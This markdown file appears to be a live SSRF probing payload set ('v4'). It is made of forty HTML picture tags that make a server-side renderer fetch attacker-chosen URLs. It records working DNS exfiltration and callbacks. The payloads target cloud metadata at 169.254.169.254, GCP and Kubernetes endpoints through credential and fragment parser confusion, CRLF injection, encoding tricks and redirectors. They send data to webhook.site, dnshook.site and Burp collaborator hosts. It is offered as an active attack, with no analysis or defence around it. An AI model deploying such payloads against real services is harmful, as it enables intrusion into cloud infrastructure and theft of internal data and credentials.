# SSRF Testing v4 - Parser Differentials & Redirect Chains

## Confirmed Findings
- DNS exfiltration via subdomains WORKS
- External HTTP callbacks WORK
- All direct internal IP access BLOCKED

## Test 1: Redirect to Internal via External
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/redirect-test" media="(min-width: 1px)"><img src="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/tracker"></picture>

## Test 2: Fragment Bypass
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca#@169.254.169.254/latest/meta-data" media="(min-width: 1px)"><img src="x"></picture>

## Test 3: URL with Credentials Bypass  
<picture><source srcset="https://169.254.169.254:80@webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/creds-bypass" media="(min-width: 1px)"><img src="x"></picture>

## Test 4: Reversed Credentials
<picture><source srcset="https://webhook.site@169.254.169.254/latest/meta-data/" media="(min-width: 1px)"><img src="x"></picture>

## Test 5: URL Parser Confusion - Backslash
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca\\@169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>

## Test 6: Unicode Domain Confusables
<picture><source srcset="https://ⓦⓔⓑⓗⓞⓞⓚ.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/unicode" media="(min-width: 1px)"><img src="x"></picture>

## Test 7: Full-width Characters
<picture><source srcset="https://ｗｅｂｈｏｏｋ.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/fullwidth" media="(min-width: 1px)"><img src="x"></picture>

## Test 8: CRLF Injection in URL
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/crlf%0d%0aHost:%20169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>

## Test 9: Tab Character Bypass
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/tab%09test" media="(min-width: 1px)"><img src="x"></picture>

## Test 10: DNS Exfil with More Data
<picture><source srcset="https://aws-metadata-169-254-169-254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/dns-exfil" media="(min-width: 1px)"><img src="x"></picture>

## Test 11: DNS Exfil - Encoded Payload
<picture><source srcset="https://aW50ZXJuYWwtc2VjcmV0.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/b64" media="(min-width: 1px)"><img src="x"></picture>

## Test 12: Numeric Domain (IP as Decimal)
<picture><source srcset="https://2852039166.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/decimal-ip" media="(min-width: 1px)"><img src="x"></picture>

## Test 13: Short Domain Redirect Service
<picture><source srcset="https://tinyurl.com/y3j2k4l5" media="(min-width: 1px)"><img src="x"></picture>

## Test 14: Bit.ly Redirect
<picture><source srcset="https://bit.ly/3xYz123" media="(min-width: 1px)"><img src="x"></picture>

## Test 15: Double URL Encoding
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/%252e%252e%252f%252e%252e%252f" media="(min-width: 1px)"><img src="x"></picture>

## Test 16: Mixed Encoding
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/%2e%2e/%252e%252e/" media="(min-width: 1px)"><img src="x"></picture>

## Test 17: URL with Port 80 Explicit
<picture><source srcset="https://webhook.site:443/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/port443" media="(min-width: 1px)"><img src="x"></picture>

## Test 18: URL with Non-standard Port
<picture><source srcset="https://webhook.site:8443/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/port8443" media="(min-width: 1px)"><img src="x"></picture>

## Test 19: IPv4-mapped IPv6 to Webhook
<picture><source srcset="https://[::ffff:185.194.77.104]/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/ipv6mapped" media="(min-width: 1px)"><img src="x"></picture>

## Test 20: Path Confusion
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/../../../etc/passwd" media="(min-width: 1px)"><img src="x"></picture>

## Test 21: Semicolon Path
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/;id=1" media="(min-width: 1px)"><img src="x"></picture>

## Test 22: Question Mark Confusion
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4?evil=http://169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>

## Test 23: Hash Before Domain
<picture><source srcset="https://evil.com#https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/hash" media="(min-width: 1px)"><img src="x"></picture>

## Test 24: IPv6 Localhost with Scope
<picture><source srcset="https://[::1%25eth0]:80/" media="(min-width: 1px)"><img src="x"></picture>

## Test 25: 0.0.0.0 Binding
<picture><source srcset="https://0.0.0.0/" media="(min-width: 1px)"><img src="x"></picture>

## Test 26: Spoofed Extension
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/image.png" media="(min-width: 1px)"><img src="x"></picture>

## Test 27: Multiple Question Marks
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4?a=1?b=2?c=3" media="(min-width: 1px)"><img src="x"></picture>

## Test 28: Newline in Path
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/test%0aevil" media="(min-width: 1px)"><img src="x"></picture>

## Test 29: Carriage Return
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/test%0devil" media="(min-width: 1px)"><img src="x"></picture>

## Test 30: AWS via DNS with Instance-ID Exfil
<picture><source srcset="https://instance-id-exfil.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4" media="(min-width: 1px)"><img src="x"></picture>

## Test 31: GCP Metadata Alt Header
<picture><source srcset="https://metadata.google.internal/computeMetadata/v1/project/project-id" media="(min-width: 1px)"><img src="x"></picture>

## Test 32: Kubernetes via DNS
<picture><source srcset="https://kubernetes-apiserver.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test 33: Generic Internal DNS
<picture><source srcset="https://internal.github.com.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test 34: Host Header via Subdomain
<picture><source srcset="https://webhook.site.169.254.169.254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test 35: Well-known Port
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/.well-known/acme-challenge/test" media="(min-width: 1px)"><img src="x"></picture>

## Test 36: SSRF Canary
<picture><source srcset="https://b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.oastify.com" media="(min-width: 1px)"><img src="x"></picture>

## Test 37: Collaborator Alternative
<picture><source srcset="https://b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.burpcollaborator.net" media="(min-width: 1px)"><img src="x"></picture>

## Test 38: DNS to Decimal IP Subdomain
<picture><source srcset="https://169.254.169.254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test 39: GitHub Raw Content Redirect
<picture><source srcset="https://raw.githubusercontent.com/jessi2000/progsjessi/main/redirect.txt" media="(min-width: 1px)"><img src="x"></picture>

## Test 40: GitHub Pages Redirect
<picture><source srcset="https://jessi2000.github.io/progsjessi/" media="(min-width: 1px)"><img src="x"></picture>

---
**Commit:** v4 - Parser differentials, credentials, encoding tricks, DNS exfil expansion
